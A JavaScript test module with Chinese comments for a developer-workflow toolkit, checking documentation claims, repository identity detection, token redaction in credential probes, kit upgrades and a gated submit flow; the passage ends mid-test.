import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { basename, dirname, join, resolve, sep } from 'node:path'
import { spawn, spawnSync } from 'node:child_process'
import {
  HERE, SCRIPTS, SKILL_ROOT, existingKept, gitInit, loadPreflight,
  readDirRefs, rmTree, runAbs, runNode, survey, textsOf, tmpProject,
} from './fixtures-helpers.mjs'

export function registerClaimsCases(cases) {
// ── 契约回查与锚点：两条新判据各自的正面与反面 ──────────────────────────

cases.push(['契约回查：分支名变了要报，路径没了要报', async () => {
  const { verifyClaims, claimsOf } = await import('../lib/claims.mjs')
  const text = [
    '从 `main` 拉分支。',
    '',
    '```sh',
    'git switch main',
    'node scripts/example.mjs',
    '```',
  ].join('\n')

  const claims = claimsOf(text)
  if (!claims.branches.includes('main')) return `没抽出分支名：${JSON.stringify(claims.branches)}`
  if (!claims.paths.includes('scripts/example.mjs')) return `没抽出路径：${JSON.stringify(claims.paths)}`

  // 正面：分支名对得上、路径都在 → 全绿
  const ok = verifyClaims(text, { conventions: { defaultBranch: 'main' } }, () => true)
  if (ok.some((r) => !r.ok)) return `正面用例被误报：${JSON.stringify(ok)}`

  // 反面一：默认分支改名了 → 必须报，而且要说清是哪一条
  const stale = verifyClaims(text, { conventions: { defaultBranch: 'trunk' } }, () => true)
  const branchHit = stale.find((r) => r.id === 'claim.branch')
  if (!branchHit || branchHit.ok) return '分支改名了却没报——契约里的分支名会指到不存在的地方'

  // 反面二：点名的路径被删了 → 必须报
  const gone = verifyClaims(text, { conventions: { defaultBranch: 'main' } }, () => false)
  const pathHit = gone.find((r) => r.id === 'claim.path')
  if (!pathHit || pathHit.ok) return '路径没了却没报——照着契约做的人会找不到文件'
  return true
}])

cases.push(['契约回查：没有承诺可查时不出结论，不伪造一条「通过」', async () => {
  const { verifyClaims } = await import('../lib/claims.mjs')
  // 一条恒真的判据看起来在工作，实际什么都没验——这类检查最容易这样退化。
  const empty = verifyClaims('没有任何路径与分支名的纯文字。', { conventions: { defaultBranch: 'main' } }, () => true)
  if (empty.length !== 0) return `没有承诺时不该出结论，实际出了 ${empty.length} 条`
  return true
}])

cases.push(['契约回查：正文里的「像路径的词」不算承诺，只有反引号与代码块里的才算', async () => {
  const { claimsOf } = await import('../lib/claims.mjs')
  // 假阳性一多，这条判据就会被关掉——而它一关，真正该报的那些也跟着没了。
  const prose = '文档里常常随口提到 scripts/whatever.mjs 这样的例子，那是叙述，不是承诺。'
  const claims = claimsOf(prose)
  if (claims.paths.length !== 0) return `散文里的词被当成了承诺：${JSON.stringify(claims.paths)}`
  return true
}])

cases.push(['锚点：前缀能命中，重名要报，落空要报', async () => {
  const { matchHeadings } = await loadPreflight()
  const headings = new Set(['七、审查循环：怎么才会停', '七、审查循环的补充', '八、谁能合：按「收不收得回来」分档'])

  // 正面：只写「七、审查循环」能同时命中两个 → 报重名（这正是要的：逼指路写得更具体）
  const ambiguous = matchHeadings(headings, '七、审查循环')
  if (ambiguous.length !== 2) return `同前缀两节应报 2 个命中，实际 ${ambiguous.length}`

  // 正面：写全了一个 → 唯一命中
  const exact = matchHeadings(headings, '七、审查循环：怎么才会停')
  if (exact.length !== 1) return `写全了应唯一命中，实际 ${exact.length}`

  // 正面：标题里带反引号也能比
  if (matchHeadings(new Set(['三、`AGENTS.md`']), '三、AGENTS.md').length !== 1) return '反引号差异没被抹平'

  // 反面：完全不存在的节 → 0 个命中
  if (matchHeadings(headings, '九、根本没有这一节').length !== 0) return '不存在的节被命中了'
  return true
}])

cases.push(['缺口覆盖：没登记处置的缺口要报，悬空映射要报', async () => {
  const { coverageOf } = await import('./gap-coverage.mjs')
  const known = new Set(['git.absent'])

  // 正面：每一条都选了一档且映射真实存在
  const good = coverageOf([
    { id: 'a', review: 'git.absent' },
    { id: 'b', decision: 'some-key' },
    { id: 'c', surveyOnly: '只有勘察能判' },
  ], known, ['a', 'b', 'c'])
  if (good.ok.length !== 3 || good.unclaimed.length !== 0 || good.dangling.length !== 0) {
    return `正面用例被误报：${JSON.stringify(good)}`
  }

  // 反面一：三档都没选 → 必须报「没人接」
  const unclaimed = coverageOf([{ id: 'x' }], known, ['x'])
  if (unclaimed.unclaimed.length !== 1) return '没登记处置的缺口没有被报出来'

  // 反面二：映射写了个不存在的 id → 必须报悬空
  const dangling = coverageOf([{ id: 'y', review: 'git.typo' }], known, ['y'])
  if (dangling.dangling.length !== 1) return '映射指向不存在的结论时没有报出来——它看起来配好了，实际永远不触发'

  // 反面三：同时写两档 → 必须报重复
  const dup = coverageOf([{ id: 'z', review: 'git.absent', decision: 'k' }], known, ['z'])
  if (dup.duplicated.length !== 1) return '一条缺口写了两档时没有报出来——同一件事会有两个结论'

  // 反面四：**一条都没读出来** → 必须报「读不出来」，不能静默通过。
  // 这是这套检查最容易退化的形状：词法切块一失灵，读出来就是空数组，
  // 而空数组让前面三条全过——「0 条各有处置，退出码 0」，看起来比 17 条还干净。
  const empty = coverageOf([], known, ['git.absent'])
  if (empty.missing.length !== 1) return '一条都没读出来时没有报「读不出来」——判据被削成恒真了'
  if (empty.ok.length !== 0) return `空输入不该产出「通过」条目，实际 ${empty.ok.length} 条`

  // 反面五：源码里有、登记名单里没有 → 必须报
  const unknown = coverageOf([{ id: 'w', review: 'git.absent' }], known, ['git.absent'])
  if (unknown.unknown.length !== 1) return '源码里有却没登记的缺口没有被报出来'
  return true
}])

cases.push(['本仓库：勘察的每条缺口在体检里都有人接，且映射不悬空', async () => {
  const { checkGapCoverage } = await import('./gap-coverage.mjs')
  // 读真实源码，不是夹具：这条判据防的正是「这个仓库自己漏了一条」。
  const state = await checkGapCoverage(SKILL_ROOT)
  if (state.unclaimed.length > 0) return `没人接的缺口：${state.unclaimed.join('、')}`
  if (state.dangling.length > 0) return `悬空映射：${state.dangling.join('、')}`
  if (state.duplicated.length > 0) return `重复处置：${state.duplicated.join('、')}`
  // 读出来 0 条时，前三条全是空数组——这个检查会静默通过。这正是「恒真」的形状。
  if (state.missing.length > 0) return `读不出来的缺口：${state.missing.join('、')}`
  if (state.unknown.length > 0) return `源码里有却没登记的缺口：${state.unknown.join('、')}`
  return true
}])

cases.push(['本仓库：正文里没有节号指针', async () => {
  // 节号会随重排失效——一次插入就让十几处指路同时指错，而它们不会报错。
  const files = ['SKILL.md', 'AGENTS.md', 'README.md', 'README.en.md', 'CONTRIBUTING.md', 'RELEASING.md',
    ...readDirRefs(join(SKILL_ROOT, 'references')), ...readDirRefs(join(SKILL_ROOT, 'templates'))]
  const hit = []
  for (const name of files) {
    const full = join(SKILL_ROOT, name)
    if (!existsSync(full)) continue
    const lines = readFileSync(full, 'utf8').replace(/\r\n/g, '\n').split('\n')
    for (const [i, line] of lines.entries()) {
      if (/第[一二三四五六七八九十]+节/.test(line)) hit.push(`${name}:${i + 1}`)
    }
  }
  if (hit.length > 0) return `这些地方还在用节号指针：${hit.slice(0, 5).join('、')}`
  return true
}])

// ── v5 升级行为断言（C1..C11 正反双向） ───────────────────────────────

cases.push(['五态身份：clone-readonly 防误判、自有缺 repository 判 maintainer、fork 与 undetermined 正反双向', async () => {
  const { classifyWorkspaceIdentity } = await import('../lib/platform/github.mjs')

  // 1. local-only：.git/pf-local-mode 强制本地模式（哪怕有远端）
  const localMode = classifyWorkspaceIdentity({
    gitFacts: { present: true, remote: 'https://github.com/other/repo.git', remoteUrls: { origin: 'https://github.com/other/repo.git' } },
    localMode: true,
  })
  if (localMode.role !== 'local-only') return `pf-local-mode 未判成 local-only：${localMode.role}`

  // 2. 反误判（核心）：clone 他人公开仓（即使 repository === origin），无写权限且历史作者非本机 -> clone-readonly，严禁判成 maintainer
  const clonedOther = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/other/demo.git',
      remoteUrls: { origin: 'https://github.com/other/demo.git' },
      commitCount: 5,
      historyAuthors: ['Origin Author <author@other.example>'],
      userName: 'Local User',
      userEmail: 'local@example.com',
    },
    declaredRepo: 'other/demo',
  })
  if (clonedOther.role !== 'clone-readonly') return `他人公开仓被误判成 ${clonedOther.role}`

  // 3. API 明确只读权限（即使历史或声明有误导）-> clone-readonly
  const apiReadOnly = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/org/lib.git',
      remoteUrls: { origin: 'https://github.com/org/lib.git' },
      commitCount: 1,
      historyAuthors: ['Me <me@example.com>'],
      userName: 'Me',
      userEmail: 'me@example.com',
    },
    declaredRepo: 'org/lib',
    probeApi: { canPush: false, viewerPermission: 'READ', login: 'outsider' },
  })
  if (apiReadOnly.role !== 'clone-readonly') return `只读 API 权限被判成 ${apiReadOnly.role}`

  // 4. 自有缺 declaredRepo 项目（本机身份匹配 origin owner 或全部提交作者匹配）-> maintainer
  const ownNoDecl = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/myuser/my-app.git',
      remoteUrls: { origin: 'https://github.com/myuser/my-app.git' },
      commitCount: 2,
      historyAuthors: ['myuser <myuser@users.noreply.github.com>'],
      userName: 'myuser',
      userEmail: 'myuser@users.noreply.github.com',
    },
  })
  if (ownNoDecl.role !== 'maintainer') return `自有缺 declaredRepo 仓未判成 maintainer：${ownNoDecl.role}`

  // 5. contributor-fork（有不同 upstream 且非只读）；反面：只读克隆他人 fork -> clone-readonly
  const forkOwn = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/me/app.git',
      remoteUrls: { origin: 'https://github.com/me/app.git', upstream: 'https://github.com/upstream/app.git' },
    },
    probeApi: { canPush: true, viewerPermission: 'WRITE', login: 'me' },
  })
  if (forkOwn.role !== 'contributor-fork') return `upstream 不同未判成 contributor-fork：${forkOwn.role}`

  const forkReadOnly = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/someone/app.git',
      remoteUrls: { origin: 'https://github.com/someone/app.git', upstream: 'https://github.com/upstream/app.git' },
    },
    probeApi: { canPush: false, viewerPermission: 'READ', login: 'me' },
  })
  if (forkReadOnly.role !== 'clone-readonly') return `只读他人 fork 被判成 ${forkReadOnly.role}`

  return true
}])

cases.push(['双轨凭据：SSH 可用不误报缺凭据、protocolMismatch 给出切换命令、Token 绝不泄露到序列化输出', async () => {
  const { probeGitHubEnv } = await import('../lib/platform/github.mjs')

  // 正面：SSH remote + ssh -T 成功 + HTTPS credential fill 返回空 -> ssh available，protocolMismatch=false，不误报
  const sshRunner = async (cmd, args) => {
    if (cmd === 'ssh') return { ok: true, code: 1, stdout: '', stderr: 'Hi octocat! You\'ve successfully authenticated, but GitHub does not provide shell access.' }
    if (cmd === 'git' && args[0] === 'credential') return { ok: false, code: 1, stdout: '', stderr: '' }
    if (cmd === 'git') return { ok: false, code: 1, stdout: '', stderr: '' }
    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
  }
  const sshRes = await probeGitHubEnv({
    remoteUrls: { origin: 'git@github.com:octocat/demo.git' },
    runner: sshRunner,
    env: {},
  })
  if (sshRes.ssh.state !== 'available' || sshRes.ssh.login !== 'octocat') {
    return `SSH 探测失败：${JSON.stringify(sshRes.ssh)}`
  }
  if (sshRes.protocolMismatch !== false) return `SSH 正常却报 protocolMismatch：${JSON.stringify(sshRes)}`
  if (sshRes.https.state === 'available') return '空 credential fill 不应判 HTTPS available'

  // 正面：HTTPS remote 无凭据但 SSH 可用 -> protocolMismatch=true 且给出 set-url 切换到 git@github.com 命令
  const mismatchRes = await probeGitHubEnv({
    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
    runner: sshRunner,
    env: {},
  })
  if (mismatchRes.protocolMismatch !== true || !String(mismatchRes.remediationCmd).includes('git@github.com:octocat/demo.git')) {
    return `protocolMismatch 提示不对：${JSON.stringify(mismatchRes)}`
  }

  // 安全脱敏：环境变量 GH_TOKEN 与 credential fill 返回的密码绝不出现在 JSON 序列化结果中
  const secretA = 'ghp_TestSecretTokenAlpha987654'
  const secretB = 'gho_CredentialHelperBeta123456'
  const tokenRunner = async (cmd, args) => {
    if (cmd === 'git' && args[0] === 'credential') {
      return { ok: true, code: 0, stdout: `protocol=https\nhost=github.com\nusername=octocat\npassword=${secretB}\n`, stderr: '' }
    }
    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
  }
  const tokRes = await probeGitHubEnv({
    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
    runner: tokenRunner,
    env: { GH_TOKEN: secretA },
  })
  const dumped = JSON.stringify(tokRes)
  if (dumped.includes(secretA) || dumped.includes(secretB)) return 'probeGitHubEnv 返回结果泄露了明文 token'
  if (tokRes.https.hasToken !== true || tokRes.https.username !== 'octocat') return `脱敏字段异常：${dumped}`

  // 真实子进程探测 survey --probe-auth --json 不得泄露 GH_TOKEN
  const dir = tmpProject({ 'README.md': '# demo\n' })
  try {
    gitInit(dir)
    const sub = await runNode('survey.mjs', [dir, '--probe-auth'])
    const subEnvRun = spawnSync(process.execPath, [join(SCRIPTS, 'survey.mjs'), dir, '--probe-auth'], {
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, GH_TOKEN: secretA, GITHUB_TOKEN: secretB },
    })
    if (subEnvRun.status !== 0) return `survey --probe-auth 退出异常：${subEnvRun.status}`
    if ((subEnvRun.stdout + subEnvRun.stderr).includes(secretA) || (subEnvRun.stdout + subEnvRun.stderr).includes(secretB)) {
      return 'survey --probe-auth 子进程输出泄露了环境变量 token'
    }
    if (sub.status !== 0) return `survey 退出 ${sub.status}`
  } finally { rmTree(dir) }

  return true
}])

cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、用户魔改/自定义保留、--bootstrap-empty 正反双向', async () => {
  const target = tmpProject({ 'README.md': '# demo\n\n工程套件测试仓。\n' })
  const kitV1 = tmpProject({
    'lib/shared.mjs': 'export const VER = 1\n',
    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v1\n---\n# v1\n',
    'old-retired/legacy.md': '# obsolete\n',
  })
  const kitV2 = tmpProject({
    'lib/shared.mjs': 'export const VER = 2\n',
    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v2\n---\n# v2\n',
  })
  const emptyBoot = mkdtempSync(join(tmpdir(), 'pf-boot-'))

  try {
    // 1. 默认官方套件首次装备 + --check + 幂等
    const e1 = runAbs('scripts/equip.mjs', [target])
    if (e1.status !== 0) return `首次 equip 失败：${e1.stderr}`
    const chk0 = runAbs('scripts/equip.mjs', [target, '--check'])
    if (chk0.status !== 0) return `equip 后 --check 未通过：${chk0.stderr}`
    const e2 = runAbs('scripts/equip.mjs', [target])
    if (e2.status !== 0) return `第二次 equip 失败：${e2.stderr}`
    const p2 = JSON.parse(e2.stdout).equip
    if (p2.added.length !== 0 || p2.upgraded.length !== 0 || p2.conflicts.length !== 0 || p2.retired.length !== 0) {
      return `equip 不幂等：${JSON.stringify(p2)}`
    }

    // 2. 用户魔改 + 自定义 Skill -> --check 必须红，v1->v2 升级保留魔改与自定义，自动升级未改文件并物理删除退役文件
    const targetTri = tmpProject({ 'README.md': '# tri\n' })
    try {
      const i1 = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1])
      if (i1.status !== 0) return `v1 装备失败：${i1.stderr}`
      // 用户修改 dev-flow/SKILL.md 且保留 old-retired/legacy.md 未改；另建用户自定义 Skill
      const customSkill = join(targetTri, '.agents', 'skills', 'my-custom', 'SKILL.md')
      mkdirSync(dirname(customSkill), { recursive: true })
      writeFileSync(customSkill, '# user custom skill\n')
      const devFlowPath = join(targetTri, '.agents', 'skills', 'dev-flow', 'SKILL.md')
      writeFileSync(devFlowPath, '# user hacked dev-flow\n')

      const dirtyChk = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1, '--check'])
      if (dirtyChk.status === 0) return '用户改动托管文件后 --check 却返回 0'

      const up = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV2])
      if (up.status !== 0) return `v2 升级失败：${up.stderr}`
      const res = JSON.parse(up.stdout).equip
      if (!res.upgraded.includes('lib/shared.mjs')) return `未改旧文件没自动升级：${JSON.stringify(res)}`
      if (!res.conflicts.some((c) => c.path === 'dev-flow/SKILL.md')) return `用户魔改文件没进 conflicts 保护：${JSON.stringify(res)}`
      if (!res.retired.includes('old-retired/legacy.md')) return `未改退役文件没进 retired：${JSON.stringify(res)}`
      if (existsSync(join(targetTri, '.agents', 'skills', 'old-retired', 'legacy.md'))) return '退役文件未被物理删除'
      if (readFileSync(devFlowPath, 'utf8') !== '# user hacked dev-flow\n') return '用户魔改内容被覆盖'
      if (!existsSync(customSkill) || readFileSync(customSkill, 'utf8') !== '# user custom skill\n') {
        return '用户自定义 Skill 被误删或覆盖'
      }
    } finally { rmTree(targetTri) }

    // 3. --bootstrap-empty 正反双向
    const boot = runAbs('scripts/equip.mjs', [emptyBoot, '--bootstrap-empty', '--lang', 'node', '--name', 'demo-boot'])
    if (boot.status !== 0) return `空目录 --bootstrap-empty 失败：${boot.stderr}`
    for (const rel of ['package.json', 'src/index.mjs', 'test/smoke.test.mjs', 'docs/TDD.md', '.agents/skills/.pf-manifest.json']) {
      if (!existsSync(join(emptyBoot, rel))) return `bootstrap-empty 缺文件：${rel}`
    }
    const smokeRun = spawnSync(process.execPath, ['--test'], { cwd: emptyBoot, encoding: 'utf8', timeout: 30000 })
    if (smokeRun.status !== 0) return `bootstrap-empty 生成的测试没跑绿：${smokeRun.stderr || smokeRun.stdout}`

    // 反面：非空目录禁止 --bootstrap-empty
    const bootNonEmpty = runAbs('scripts/equip.mjs', [target, '--bootstrap-empty', '--lang', 'node'])
    if (bootNonEmpty.status === 0) return '非空目录却允许 --bootstrap-empty'

    return true
  } finally {
    rmTree(target)
    rmTree(kitV1)
    rmTree(kitV2)
    rmTree(emptyBoot)
  }
}])

cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA256 变化时保护不覆盖', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"cap-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
    'README.md': '# cap-demo\n\n体积限制与基线保护测试仓。\n',
  })
  gitInit(dir)
  try {
    const eq = runAbs('scripts/equip.mjs', [dir])
    if (eq.status !== 0) return `equip 失败：${eq.stderr}`
    const g1 = runAbs('scripts/compose-agents.mjs', [dir])
    if (g1.status !== 0) return `compose-agents 首次生成失败：${g1.stderr}`

    const agentsFile = join(dir, 'AGENTS.md')
    const original = readFileSync(agentsFile, 'utf8')

    // 1. 保护未标 customized 但已被手工改动且偏离模板的区间（修改「版本与发布」段落而不加 customized）
    const edited = original.replace('**提交纪律**：', '**提交纪律（手工微调）**：')
    if (edited === original) return '测试前置替换未命中 AGENTS.md 版本与发布段'
    writeFileSync(agentsFile, edited, 'utf8')

    // 当「版本与发布」与模板不一致且与 .pf-manifest.json 基线 SHA256 不同时，必须保护跳过并保留手工内容
    const g2 = runAbs('scripts/compose-agents.mjs', [dir])
    if (g2.status !== 0) return `保护场景刷新失败：${g2.stderr}`
    if (!/保护跳过/.test(g2.stderr || '') || !readFileSync(agentsFile, 'utf8').includes('手工微调')) {
      return `未标 customized 的手工改动没有被保护跳过：stderr=${g2.stderr}`
    }

    // 2. 反面：AGENTS.md 超 30KB 时刷新必须退出 1 阻断写入
    const oversized = `${original}\n\n## 补充说明\n\n${'x'.repeat(32000)}\n`
    writeFileSync(agentsFile, oversized, 'utf8')
    const g3 = runAbs('scripts/compose-agents.mjs', [dir])
    if (g3.status === 0) return 'AGENTS.md 超过 30720 字节时 compose-agents 没有报错阻断'
    if (!readFileSync(agentsFile, 'utf8').includes('## 补充说明')) return '超限阻断时改动了原文件'

    return true
  } finally { rmTree(dir) }
}])

cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解绑不删穿主仓、锁文件变化自动隔离', async () => {
  const dir = tmpProject({
    '.gitignore': 'node_modules/\n.worktrees/\n',
    'package.json': '{"name":"deps-demo","version":"1.0.0"}\n',
    'package-lock.json': '{"name":"deps-demo","lockfileVersion":3}\n',
    'README.md': '# deps\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
  const mainPkgFile = join(dir, 'node_modules', 'fake-pkg', 'index.js')
  mkdirSync(dirname(mainPkgFile), { recursive: true })
  writeFileSync(mainPkgFile, 'module.exports = { ok: true }\n')

  const wt = join(dir, '.worktrees', 'impl-deps')
  try {
    const addWt = spawnSync('git', ['worktree', 'add', wt, '-b', 'feat/deps-test'], { cwd: dir, encoding: 'utf8' })
    if (addWt.status !== 0) return `创建 worktree 失败：${addWt.stderr}`

    // 正面：锁文件一致 -> mount 挂载并可读
    const m1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
    if (m1.status !== 0) return `mount 失败：${m1.stderr}`
    const wtPkgFile = join(wt, 'node_modules', 'fake-pkg', 'index.js')
    if (!existsSync(wtPkgFile) || !readFileSync(wtPkgFile, 'utf8').includes('ok: true')) {
      return 'mount 后无法通过 worktree 读取共享 node_modules'
    }

    // 正面：unmount 安全解绑后主仓 node_modules 完好无损
    const u1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt, '--json'])
    if (u1.status !== 0) return `unmount 失败：${u1.stderr}`
    if (existsSync(join(wt, 'node_modules'))) return 'unmount 后 worktree node_modules 依然存在'
    if (!existsSync(mainPkgFile) || !readFileSync(mainPkgFile, 'utf8').includes('ok: true')) {
      return 'unmount 删穿了主仓 node_modules'
    }

    // 反面：worktree 锁文件变化 -> 拒绝挂载，自动隔离
    writeFileSync(join(wt, 'package-lock.json'), '{"name":"deps-demo","lockfileVersion":3,"changed":true}\n')
    const m2 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
    if (m2.status !== 0) return `锁文件不一致时 mount 应安全跳过而非崩溃：${m2.stderr}`
    const m2Json = JSON.parse(m2.stdout)
    if (m2Json.mode !== 'isolated' || m2Json.reason !== 'lockfile-changed' || (m2Json.mismatches?.length ?? 0) === 0 || m2Json.mounted.length !== 0 || existsSync(join(wt, 'node_modules'))) {
      return `锁文件变化后未自动隔离：${m2.stdout}`
    }

    return true
  } finally {
    try { runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt]) } catch {}
    spawnSync('git', ['worktree', 'remove', '--force', wt], { cwd: dir, stdio: 'ignore' })
    rmTree(dir)
  }
}])

cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖图、finalize/verify/submit 硬锁、fork 禁止合并与删前锁定', async () => {
  const { triageTask } = await import('../../kit/skills/dev-plan/scripts/doc-plan.mjs')
  const { analyzeIssueDependencies } = await import('../../kit/skills/dev-flow/scripts/flow.mjs')

  // 1. 五档分流全覆盖（Case 1..5）
  if (triageTask({ summary: '修正 README 错别字', files: 1 }).caseType !== 1) return 'Case 1 分流误判'
  if (triageTask({ summary: 'fix parser crash on empty input', files: 1, bugfix: true }).caseType !== 2) return 'Case 2 分流误判'
  if (triageTask({ summary: 'feat: add CSV output flag', files: 2 }).caseType !== 3) return 'Case 3 分流误判'
  if (triageTask({ summary: '跨模块接口变更', touchesContract: true }).caseType !== 4) return 'Case 4 分流误判'
  const c5 = triageTask({ summary: '推翻 TDD 架构重新设计核心引擎', conflictsTdd: true })
  if (c5.caseType !== 5 || c5.blocked !== true) return `Case 5 未阻断：${JSON.stringify(c5)}`

  // 2. 多 Issue 依赖边与环检测
  const graphOk = analyzeIssueDependencies([
    { number: 1, relations: { dependsOn: [], blocks: [] } },
    { number: 2, relations: { dependsOn: [1], blocks: [3] } },
    { number: 3, relations: { dependsOn: [], blocks: [] } },
  ])
  if (graphOk.hasCycle || graphOk.edges.length < 2 || graphOk.orderedIssues[0] !== 1 || graphOk.orderedIssues[2] !== 3) {
    return `依赖拓扑解析失败：${JSON.stringify(graphOk)}`
  }
  const graphCycle = analyzeIssueDependencies([
    { number: 10, relations: { dependsOn: [11], blocks: [] } },
    { number: 11, relations: { dependsOn: [10], blocks: [] } },
  ])
  if (!graphCycle.hasCycle) return '环形 Issue 依赖未检出'

  // 3. 真实本地工作流：Case 3 start -> Todo 未勾选阻断 finalize -> 未 finalize 阻断 submit -> 代码改动使 verifiedHead 失效 -> submit 成功
  const localDir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"flow-local","version":"1.0.0"}\n',
    'README.md': '# flow-local\n',
    'docs/TDD.md': '# TDD\n',
    'src/app.mjs': 'export const n = 1\n',
  })
  gitInit(localDir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: localDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 't'], { cwd: localDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: localDir, stdio: 'ignore' })

  try {
    const start1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-flow', '--case', '3', '--slug', 'demo-feat', '--json'], { cwd: localDir })
    if (start1.status !== 0) return `flow start 失败：${start1.stderr}`
    const ledger1 = JSON.parse(start1.stdout)
    const wtRoot = join(localDir, ledger1.worktreePath)

    // 建未勾选 Todo -> finalize 必须失败
    const todoInit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--type', 'todo', '--slug', 'demo-feat', '--title', '测试任务', '--task', 't-flow', '--json'], { cwd: wtRoot })
    if (todoInit.status !== 0) return `doc-plan init todo 失败：${todoInit.stderr}`
    const todoInfo = JSON.parse(todoInit.stdout)

    const finBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
    if (finBlocked.status === 0) return 'Todo 仍有未勾选条目，finalize 却放行了'

    // 勾选 Todo 并提交；故意不运行 finalize，先 verify 再 submit -> submit 必须返回 3（BLOCKED_NOT_FINALIZED）
    const todoAbs = join(wtRoot, todoInfo.file)
    writeFileSync(todoAbs, readFileSync(todoAbs, 'utf8').replace(/- \[ \]/g, '- [x]'))
    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'check todo'], { cwd: wtRoot, stdio: 'ignore' })

    const v1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
    if (v1.status !== 0) return `verify 失败：${v1.stderr}`
    const subNoFin = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
    if (subNoFin.status !== 3 || !/BLOCKED_NOT_FINALIZED/.test(subNoFin.stderr)) {
      return `未 finalize 时 submit 未拦截：exit=${subNoFin.status} stderr=${subNoFin.stderr}`
    }

    // finalize 后再改非文档代码并提交，使 verifiedHead !== HEAD -> submit 必须拦截
    const finOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
    if (finOk.status !== 0) return `finalize 失败：${finOk.stderr}`
    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'archive todo'], { cwd: wtRoot, stdio: 'ignore' })

    writeFileSync(join(wtRoot, 'src/app.mjs'), 'export const n = 2\n')
    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'code change after verify'], { cwd: wtRoot, stdio: 'ignore' })
    const subStale = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
    if (subStale.status !== 3) return `代码变更后 verifiedHead 失效未拦截 submit：exit=${subStale.status} stderr=${subStale.stderr}`

    // 重跑 finalize + verify -> submit 放行退出 0
    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
    const subOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
    if (subOk.status !== 0) return `本地完整校验后 submit 失败：exit=${subOk.status} stderr=${subOk.stderr}`
  } finally {
    const wtCleanup = join(localDir, '.worktrees', 'impl-t-flow')
    spawnSync('git', ['worktree', 'remove', '--force', wtCleanup], { cwd: localDir, stdio: 'ignore' })
    rmTree(localDir)
  }

  // 4. inspect 识别已有 Issue+PR 复用；contributor-fork 禁止 merge 与 OPEN PR 禁止 cleanup
  const forkDir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"fork-demo","version":"1.0.0"}\n',
    'README.md': '# fork-demo\n',
  })
  gitInit(forkDir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 'me'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 'me@example.com'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/me/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['remote', 'add', 'upstream', 'https://github.com/upstream/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })

  try {
    const insp = runAbs('kit/skills/dev-flow/scripts/flow.mjs', [
      'inspect', 'https://github.com/upstream/fork-demo/issues/12', 'https://github.com/upstream/fork-demo/pull/34', '--json',
    ], { cwd: forkDir })
